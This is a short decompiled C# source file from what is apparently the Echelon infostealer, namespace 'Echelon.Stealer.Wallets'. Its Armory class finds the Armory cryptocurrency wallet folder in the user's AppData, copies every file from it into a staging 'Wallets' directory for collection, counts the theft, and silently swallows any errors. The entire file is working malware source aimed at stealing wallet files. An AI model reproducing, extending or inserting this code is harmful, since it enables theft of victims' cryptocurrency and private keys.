using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000008 RID: 8
	internal class Armory
	{
		// Token: 0x0600002D RID: 45 RVA: 0x000196DC File Offset: 0x000178DC
		public static void ArmoryStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Help.AppDate + "\\Armory\\"))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Help.AppDate + "\\Armory\\").GetFiles())
					{
						Directory.CreateDirectory(directorypath + "\\Wallets\\Armory\\");
						fileInfo.CopyTo(directorypath + "\\Wallets\\Armory\\" + fileInfo.Name);
					}
					Armory.count++;
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000033 RID: 51
		public static int count;
	}
}
